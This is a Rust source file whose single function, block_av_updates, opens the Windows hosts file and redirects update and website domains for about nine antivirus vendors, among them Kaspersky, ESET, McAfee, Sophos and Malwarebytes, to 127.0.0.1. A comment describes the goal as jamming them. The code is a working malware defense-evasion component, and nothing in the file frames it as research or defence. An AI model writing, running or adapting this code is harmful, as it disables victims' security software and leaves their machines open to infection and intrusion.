#[cfg(windows)]
use std::fs::OpenOptions;
#[cfg(windows)]
use std::io::{Read, Write};
#[cfg(windows)]
use std::path::PathBuf;

#[cfg(windows)]
pub fn block_av_updates() -> Result<(), Box<dyn std::error::Error>> {
    let hosts_path = PathBuf::from("C:\\Windows\\System32\\drivers\\etc\\hosts");
    
    if !hosts_path.exists() {
        return Ok(()); // Should exist on Windows
    }

    // List of AV Update Domains to JAM (Redirect to localhost)
    let blocklist = vec![
        // Kaspersky
        "kaspersky.com", "www.kaspersky.com", "update.kaspersky.com", "dnl-01.geo.kaspersky.com", "dnl-02.geo.kaspersky.com",
        
        // Bitdefender
        "bitdefender.com", "www.bitdefender.com", "upd.bitdefender.com", "nimbus.bitdefender.net",
        
        // ESET
        "eset.com", "www.eset.com", "update.eset.com", "expire.eset.com",
        
        // Avast / AVG
        "avast.com", "www.avast.com", "su.ff.avast.com", "p.ff.avast.com",
        "avg.com", "www.avg.com", "update.avg.com",
        
        // McAfee
        "mcafee.com", "www.mcafee.com", "update.mcafee.com", "liveupdate.mcafee.com",
        
        // Symantec / Norton
        "symantec.com", "norton.com", "liveupdate.symantecliveupdate.com", "update.symantec.com",
        
        // Sophos
        "sophos.com", "www.sophos.com", "d1.sophosupd.com", "d2.sophosupd.com",
        
        // TrendMicro
        "trendmicro.com", "www.trendmicro.com", "grid-global.trendmicro.com",
        
        // Malwarebytes
        "malwarebytes.com", "www.malwarebytes.com", "data-cdn.mbamupdates.com", "keystone.mwbsys.com"
    ];

    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .append(true)
        .open(&hosts_path)?;

    let mut content = String::new();
    file.read_to_string(&mut content)?;

    let mut needs_newline = false;
    if !content.is_empty() && !content.ends_with('\n') {
        needs_newline = true;
    }

    for domain in blocklist {
        if !content.contains(domain) {
            if needs_newline {
                writeln!(file)?;
                needs_newline = false; 
            }
            // 127.0.0.1 domain.com
            writeln!(file, "127.0.0.1 {}", domain)?;
        }
    }

    Ok(())
}

#[cfg(not(windows))]
pub fn block_av_updates() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}
